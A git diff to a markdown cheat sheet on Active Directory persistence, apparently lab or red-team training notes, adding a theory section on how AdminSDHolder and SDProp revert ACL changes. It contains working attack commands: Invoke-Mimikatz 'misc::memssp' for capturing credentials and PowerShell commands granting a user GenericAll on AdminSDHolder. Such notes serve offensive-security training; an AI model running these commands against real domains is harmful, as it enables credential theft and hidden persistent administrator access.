@@ -8,7 +8,15 @@ With MimiKatz, or the use of mimilib.dll.
 Invoke-Mimikatz -Command '"misc::memssp"'
 ```
 
-### **ACLs – AdminSDHolder**
+## **ACLs – AdminSDHolder**
+
+### Theory
+
+When you modify the ACLs to gain persistence might happen that you changes can be reverted by the sanitization methods, like the **Security Descriptor Propagate,** in particular the Protected Groups (Domain admins, Backup Operators ecc....).
+
+It works by comparing the actual ACL with the AdminSDHolder's one and any difference is overwritten
+
+### Abuse
 
 #### Modify the ACLs to add Full Control permissions for a user to the AdminSDHolder using PowerView as a Domain Admin
 
@@ -32,7 +40,7 @@ Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=<DOMAIN>,DC=<DOMAIN>
 Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
 ```
 
-### **ACLs – Right Abuse**
+## **ACLs – Right Abuse on Domain Objecy**
 
 #### _Add FullControl rights_ using powershell
 
